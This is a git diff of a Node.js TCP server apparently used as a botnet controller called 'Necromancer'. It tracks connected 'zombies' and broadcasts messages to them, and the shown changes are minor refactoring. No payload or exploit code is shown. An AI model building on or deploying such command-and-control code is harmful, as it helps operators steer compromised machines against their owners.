@@ -2,7 +2,7 @@ import net from "net";
 import { prompt, saveFile } from "./commands.js";
 import dotenv from "dotenv";
 
-dotenv.config({ path: "../config/.env" });
+dotenv.config({ path: "../../config/.env" });
 
 let clients, clientInstances, silent, logging;
 
@@ -10,7 +10,7 @@ const clientModules = {
 	clients: (clients = []),
 	clientInstances: clientInstances,
 	silent: (silent = false),
-	logging: (logging = false)
+	logging: (logging = false),
 };
 
 const PORT = process.env.PORT;
@@ -19,7 +19,6 @@ const IP = process.env.IP;
 function setTerminalTitle() {
 	process.title = `Necromancer | Zombies: ${clients.length}`;
 }
-setTerminalTitle();
 
 function broadcast(message) {
 	for (const client of clientModules.clientInstances) {
@@ -28,10 +27,8 @@ function broadcast(message) {
 }
 
 net.createServer((socket) => {
-	// Identify client
 	socket.name = `${socket.remoteAddress}:${socket.remotePort}`;
 
-	// On client connect
 	clientModules.clients.push(socket);
 	clientModules.clientInstances = [...clientModules.clients];
 	setTerminalTitle();
@@ -70,6 +67,7 @@ net.createServer((socket) => {
 	}
 }).listen(PORT, IP);
 
+setTerminalTitle();
 console.clear();
 console.log(`\x1b[31m
  ███▄    █  ▄████▄   ██▀███   ███▄ ▄███▓ ███▄    █  ▄████▄   ██▀███  
